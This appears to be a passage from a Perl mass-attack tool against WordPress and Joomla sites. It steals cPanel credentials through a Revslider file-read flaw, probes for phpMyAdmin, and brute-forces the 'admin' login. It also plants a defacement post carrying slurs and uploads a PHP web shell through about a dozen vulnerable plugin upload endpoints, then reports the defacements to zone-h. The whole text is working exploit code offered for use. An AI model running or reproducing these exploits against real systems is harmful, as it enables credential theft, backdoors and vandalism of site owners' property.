$ua->timeout (10);
$cpup = "wp-admin/admin-ajax.php?action=revslider_show_image&img=../../.my.cnf";
$cpuplink = "$site/$cpup";
$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$cont = $resp->content;
if($cont =~ m/user=/g && $cont =~ m/password=/g){
    print color('bold green');
print "[+] Fucked [+]\n";
    print color('reset');

    print save "[rev cpnl] $site\n";   
    close(save);
$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$contt = $resp->content;
while($contt =~ m/user/g){
        if ($contt =~ /user=(.*)/){

        print "\n\t[-]Cpanel User = $1 \n";
print color 'reset';
        open (TEXT, '>>rzlt/cp.txt');
        print TEXT "\n[ cpanel ] \n$site\n[-]cpanel user = $1";
        close (TEXT);
        }
        if ($contt =~ /password="(.*)"/){
        print "\t[-]Cpanel Pass = $1 \n\n";
print color 'reset';
        open (TEXT, '>>rzlt/cp.txt');
        print TEXT "\n[-]Cpanel Pass = $1";
        close (TEXT)
        }


}
}else{    print color('bold red');
print  "[+] 7achwa [+]\n";
    print color('reset');

}


}





sub pmaa{
print color('bold white')," [+]Php My Admin Wp [+]...";

use HTTP::Request;
use LWP::UserAgent;
@pat=('/phpMyAdmin/','/phpmyadmin/');
foreach $pma(@pat){
chomp $pma;

$url = $site.$pma;
$req = HTTP::Request->new(GET=>$url);
$userAgent = LWP::UserAgent->new();
$response = $userAgent->request($req);
$ar = $response->content;
if ($ar =~ m/Welcome to phpMyAdmin|Username|Password/g){
    print color('bold green');
print "[+] Fucked [+]\n";
    print color('reset');
open (TEXT, '>>rzlt/config.txt');
print TEXT "\n[PhpMyAdmin] $url \n\n";
close (TEXT);

}else{

    print color('bold red');
print  "[+] 7achwa [+]\n";
    print color('reset');

}}

}

######################
######################
######################
## Wordpress Inject ##
######################
######################
######################
sub wpinjetc($site){
print color('bold white'),"[+]Wordpress Inject [+]...";

$linkposts = $site . 'index.php/wp-json/wp/v2/posts/';



$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (30);


$sorm = $ua->get($linkposts);
$karza = $sorm->content;
if($karza =~/\/?p=(.*?)\"\}/)
{
$id=$1;
$ajx = $site . '/wp-json/wp/v2/posts/'.$id;



  
$defx="                           <h2><center>ADAM TNX <center></h2>
            </div>
            <div class=\"post_content\">
              <p><title>HACKED BY ADAM TNX
</title></p>
<div style=\"text-align: center\"><font size=\"6\" face=\"comic sans ms\"><b>Hacked By Adam Tnx</b></font></div>
<div style=\"text-align: center\"><font size=\"5\" face=\"comic sans ms\"><b><br /></b></font></div>
<div style=\"text-align: center\"><font size=\"5\" face=\"comic sans ms\"><b><font color=red>HACKED</font> BY ADAM TNX tnx <font color=red>FROM</font> Adam Tnx <font color=red>GIANTS PS</font> AND <font color=red>FALLAGA</font> TEAM <font color=red>WE SAY ISRAHELL</font> NOT ISRAEL - SON OF BITCHES <br /></b></font></div>

<p>
            </div>";
$file="tnx.html";
$sirina=$id . 'justracccwdata';
$def=  $site . 'tnx.html';
$gassface = POST $ajx, ['id' => $sirina, 'title' => 'HACKED BY ADAM TNX', 'slug'=> $file,'content' => $defx];
$response = $ua->request($gassface);
$stat = $response->content;
  if ($stat =~ /ADAM tnx/){
   print color('bold green');
print "[Succes]\n";
    print color('reset');
            open(save, '>>rzlt/index.txt');  
    print save "$def\n";  
    close(save);
zoneh();

  }
else{
   print color('bold red');
print "[+] 7achwa [+]\n";
    print color('reset');}
}
else{
   print color('bold red');
print "[+] 7achwa [+]\n";
    print color('reset');}
}



######################
######################
######################
## Wordpress Brute ###
######################
######################
######################
sub wpbrute{
$red = $site . '/wp-admin/';
$wp= $site . 'wp-login.php';
$admin = "admin";

print color('bold white'),"[Wordpress Brute]... ";


print "\n USER : $admin\nPASSWORD : $pass\n";
$brute = POST $wp, [log => $admin, pwd => $pass, wp-submit => 'Log In', redirect_to => $red];
$response = $ua->request($brute);
$stat = $response->status_line;
        if ($stat =~ /302/){
    print color('bold green');
print "[+] Fucked [+]\n";
    print color('reset');
        open (TEXT, '>>rzlt/brute.txt');
        print TEXT "\n$site/wp-login.php => User :$admin Password:$pass\n";
        close (TEXT);
        }else{
    print color('bold red');
print  "[+] 7achwa [+]\n";
    print color('reset');

}
pmaa();
}


sub revshell(){
print color('bold white')," [+]Revslider Shell [+]...";

my $path = "wp-admin/admin-ajax.php";


my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [action => "revslider_ajax_action", client_action => "update_plugin", update_file => ["taz.zip"]]);

if ($exploit->decoded_content =~ /Wrong update extracted folder/) {
    print color('bold green');
print "[+] Fucked [+]\n";
    print color('reset');

my $check = $ua->get("$site/wp-content/plugins/revslider/temp/update_extract/revslider/tnx.php")->content;
if($check =~/Adam Tnx/) {

      print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
      print color('bold green');
print "[+] Fucked [+]\n";
    print color('reset');

    open(save, '>>rzlt/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/plugins/revslider/temp/update_extract/revslider/tnx.php\n";
    close(save); 
  $def = "$site/v4.html";
    } else {  }
my $avada = $ua->get("$site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/tnx.php")->content;
if($avada =~/Adam Tnx/) {

      print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
      print color('bold green');
print "[+] Fucked [+]\n";
    print color('reset');    open(save, '>>rzlt/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/tnx.php\n";
    close(save); 
      $def = "$site/v4.html";

}
else {  }
my $striking_r = $ua->get("$site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/tnx.php")->content;
if($striking_r =~/Adam Tnx/) {

      print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
      print color('bold green');
print "[+] Fucked [+]\n";
    print color('reset');    open(save, '>>rzlt/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/tnx.php\n";
    close(save); 
    $def = "$site/v4.html";

}
else {  }
my $IncredibleWP = $ua->get("$site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/tnx.php")->content;
if($IncredibleWP =~/Adam Tnx/) {

      print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
      print color('bold green');
print "[+] Fucked [+]\n";
    print color('reset');    open(save, '>>rzlt/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/tnx.php\n";
    close(save); 
    $def = "$site/v4.html";

}
else {  }
my $ultimatum = $ua->get("$site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/tnx.php")->content;
if($ultimatum =~/Adam Tnx/) {

      print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
      print color('bold green');
print "[+] Fucked [+]\n";
    print color('reset');    open(save, '>>rzlt/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/tnx.php\n";
    close(save); 
    $def = "$site/v4.html";

}
else {  }
my $medicate = $ua->get("$site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/tnx.php")->content;
if($medicate =~/Adam Tnx/) {

      print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
      print color('bold green');
print "[+] Fucked [+]\n";
    print color('reset');    open(save, '>>rzlt/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/tnx.php\n";
    close(save); 
    $def = "$site/v4.html";

}
else {  }
my $centum = $ua->get("$site/wp-content/themes/centum/revslider/temp/update_extract/revslider/tnx.php")->content;
if($centum =~/Adam Tnx/) {

      print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
      print color('bold green');
print "[+] Fucked [+]\n";
    print color('reset');    open(save, '>>rzlt/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/centum/revslider/temp/update_extract/revslider/tnx.php\n";
    close(save); 
    $def = "$site/v4.html";

}
else {  }
my $beach_apollo = $ua->get("$site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/tnx.php")->content;
if($beach_apollo =~/Adam Tnx/) {

      print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
      print color('bold green');
print "[+] Fucked [+]\n";
    print color('reset');    open(save, '>>rzlt/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/tnx.php\n";
    close(save); 
    $def = "$site/v4.html";

}
else { }
my $cuckootap = $ua->get("$site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/tnx.php")->content;
if($cuckootap =~/Adam Tnx/) {

      print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
      print color('bold green');
print "[+] Fucked [+]\n";
    print color('reset');    open(save, '>>rzlt/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/tnx.php\n";
    close(save); 
    $def = "$site/v4.html";

}
else {  }
my $pindol = $ua->get("$site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/tnx.php")->content;
if($pindol =~/Adam Tnx/) {

    print "[+] pindol successfully uploaded\n";
    open(save, '>>rzlt/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/tnx.php\n";
    close(save); 
    $def = "$site/v4.html";

}
else {  }
my $designplus = $ua->get("$site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/tnx.php")->content;
if($designplus =~/Adam Tnx/) {

      print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
      print color('bold green');
print "[+] Fucked [+]\n";
    print color('reset');    open(save, '>>rzlt/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/tnx.php\n";
    close(save); 
    $def = "$site/v4.html";

}
else {  }
my $rarebird = $ua->get("$site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/tnx.php")->content;
if($rarebird =~/Adam Tnx/) {

      print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
      print color('bold green');
print "[+] Fucked [+]\n";
    print color('reset');
    open(save, '>>rzlt/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/tnx.php\n";
    close(save); 
    $def = "$site/v4.html";

}
else {  }
my $andre = $ua->get("$site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/tnx.php")->content;
if($andre =~/Adam Tnx/) {

      print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
      print color('bold green');
print "[+] Fucked [+]\n";
    print color('reset');    open(save, '>>rzlt/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/tnx.php\n";
    close(save); 
    $def = "$site/v4.html";

}
else { }
} else {
    print color('bold red');
print  "[+] 7achwa [+]\n";
    print color('reset');
}
}
#showbiz
sub showbiz(){
print color('bold white'),"[+]Showbiz[+]... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (10);
sub upxx(){
my $zip_sho = "showbiztaz.zip";
my $action_sho = "showbiz_ajax_action";
my $update_file_sho = "$zip_sho";
my $path = "wp-admin/admin-ajax.php";
my $shell_path_sho = "wp-content/plugins/showbiz/temp/update_extract/showbiz/sxv3.php";

my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [action => "$action_sho", client_action => "update_plugin", update_file => ["$update_file_sho"]]);

if ($exploit->decoded_content =~ /Wrong update extracted folder/)
        {
        print "[+] Payload Executed Succeflly.\n";
        print "[~] Checking Shell.\n";
    my $conte = $ua->get("$site/$shell_path_sho")->content;
if ($conte =~/Adam Tnx/){
print color('bold green');
print "[+] Fucked [+]\n$site/$shell_path_sho\n";
print color('reset');

                open (DONE, '>>rzlt/Shell3z.txt');
                print DONE "$site/$shell_path_sho\n";
}
        else
                {
    print color('bold red');
print  "[+] 7achwa [+]\n";
    print color('reset');
                }
        }

elsif ($exploit->decoded_content =~ /Wrong request/) {
    print color('bold red');
print  "[+] 7achwa [+]\n";
    print color('reset');
}

elsif ($exploit->decoded_content =~ m/0$/) {
    print color('bold red');
print  "[+] 7achwa [+]\n";
    print color('reset');
}

else {
$exploit->decoded_content =~ /<\/b>(.*?)<br>/;
    print color('bold red');
print  "[+] 7achwa [+]\n";
    print color('reset');
}
}
upxx();



}
}
sub adblocker(){
my $url = "$site/wp-admin/admin.php?page=blaze_manage";
my $blazeres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["tnx.php"], task => 'blaze_add_new_album', album_name => '', album_desc => '',]);

if ($blazeres->content =~ /\/uploads\/blaze\/(.*?)\/big\/tnx.php/) {
$uploadfolder=$1;
$blazeup="$site/wp-content/uploads/blaze/$uploadfolder/big/tnx.php";

print color('bold white'),"[+]Blaze[+]...";

print color('bold green'),"[+]fucked[+]";
print color('bold white'),"\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [shell] => $blazeup\n";
open (TEXT, '>>rzlt/Shells.txt');
print TEXT "$blazeup\n";
close (TEXT);
}else{

print color('bold white'),"[+]Blaze[+]...";
print color('bold red'),"[+]7achwa[+]";
print color('bold white'),"\n";
}
}
sub cheryy(){

my $url = "$site/wp-content/plugins/cherry-plugin/admin/import-export/upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file => ["tnx.php"],]);

$cherryup="$site/wp-content/plugins/cherry-plugin/admin/import-export/tnx.php";

my $checkcherry = $ua->get("$cherryup")->content;
if($checkcherry =~/Adam tnx/) {
print color('bold white'),"[+]cherry plugin[+]...";
print color('bold green'),"[+]fucked[+]";
print color(' bold white'),"\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"[shell] => $cherryup\n";
open (TEXT, '>>rzlt/Shells.txt');
print TEXT "$cherryup\n";
close (TEXT);
}else{
print color('bold white'),"[+]cherry plugin[+]...";
print color('bold red'),"[+]7achwa[+]";
print color('bold white'),"\n";
}
}

sub slideshow(){ 
my $url = "$site/wp-admin/admin.php?page=slideshowpro_manage";

my $slideshowres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["tnx.php"], task => 'pro_add_new_album', album_name => '', album_desc => '',]);

if ($slideshowres->content =~ /\/uploads\/slideshowpro\/(.*?)\/big\/tnx.php/) {
$uploadfolder=$1;
$sspup="$site/wp-content/uploads/slideshowpro/$uploadfolder/big/tnx.php";

print color('bold white'),"[+]Slide Show Pro[+]...";
print color('green'),"[+]fucked[+]";
print color('bold white'),"\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [shell] => $sspup\n";
open (TEXT, '>>rzlt/Shells.txt');
print TEXT "$sspup\n";
close (TEXT);
}else{
print color('bold white'),"[+]Slide Show Pro[+]...";
print color('bold red'),"[+]7achwa[+]";
print color('bold white'),"\n";
}
}
sub simpleslideshow(){
  my $url = "$site/modules/simpleslideshow/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["tnx.php"],]);

$simpleslideshowup="$site/modules/simpleslideshow/slides/tnx.php";

my $checksimpleslideshow = $ua->get("$simpleslideshowup")->content;
if($checksimpleslideshow =~/Adam tnx/) {

print color('bold white'),"[+]simple slideshow[+]...";
print color('bold green'),"[+]fucked[+]";
print color('bold white'),"\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [shell] => $simpleslideshowup\n";
open (TEXT, '>>rzlt/Shells.txt');
print TEXT "$simpleslideshowup\n";
close (TEXT);
}else{
print color('bold white'),"[+]simple slideshow[+]...";
print color('bold red'),"[+]7achwa[+]";
print color('bold white'),"\n";
}

}

sub worktf(){
my $url = "$site/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/";
my $shell ="tnx.php";
my $field_name = "files[]";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$wtffup="$site/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/tnx.php";

$checkwtffup = $ua->get("$wtffup")->content;
if($checkwtffup =~/Adam Tnx/) {
print color('bold white'),"[+]Work The Flow File Upload[+]...";
print color('bold green'),"[+]fucked[+]";
print color('bold white'),"\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $wtffup\n";
open (TEXT, '>>rzlt/Shells.txt');
print TEXT "$wtffup\n";
close (TEXT);
}else{
print color('bold white'),"[+]Work The Flow File Upload[+]...";
print color('bold red'),"[+]7achwa[+]";
print color('bold white'),"\n";
}
}
sub comfabr(){
  my $url = "$site/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload";
my $shell ="tnx.php";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => ["file" => ["$shell"]]
           
            );

$comfabrikupp2="$site/tnx.php";

$checkcomfabrikupp = $ua->get("$comfabrikupp2")->content;
if($checkcomfabrikupp =~/Adam Tnx/) {

print color('bold white'),"[+]Com Fabrik[+]...";
print color('bold green'),"[+]fucked[+]";
print color('bold white'),"\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $comfabrikupp2\n";
open (TEXT, '>>rzlt/Shells.txt');
print TEXT "$comfabrikupp\n";
close (TEXT);
}else{
print color('bold white'),"[+]Work The Flow File Upload[+]...";
print color('bold red'),"[+]7achwa[+]";
print color('bold white'),"\n";
}
}

######################
######################
######################
#####  Zone-H   ######
######################
######################
######################
sub zoneh(){
print color('bold white'),"[+]Zone-h[+]...";

    open(save, '>>rzlt/index.txt');
    print save "$def\n";
    close(save);

                                $hack="adam tnx";
                                $zn="http://zone-h.org/notify/single";
                                $lwp=LWP::UserAgent->new;
                                $res=$lwp  -> post($zn,[
                                'defacer'     => $hack,
                                'domain1'   => $def,
                                'hackmode' => '15',
                                'reason'       => '1',
                                'submit'       => 'Send',
                                ]);
                                if ($res->content =~ /color="red">ERROR<\/font><\/li>/) {
print color('bold red'),"[+]7achwa[+]";
print color('bold white'),"\n";

                                }
                                elsif ($res->content =~ /color="red">OK<\/font><\/li>/) {
print color('bold green'),"[+]fucked[+]";
print color('bold white'),"\n";
                                }
                                else
                                {
print color('bold red'),"[+]7achwa[+]";
print color('bold white'),"\n"; 
                            }
              
}
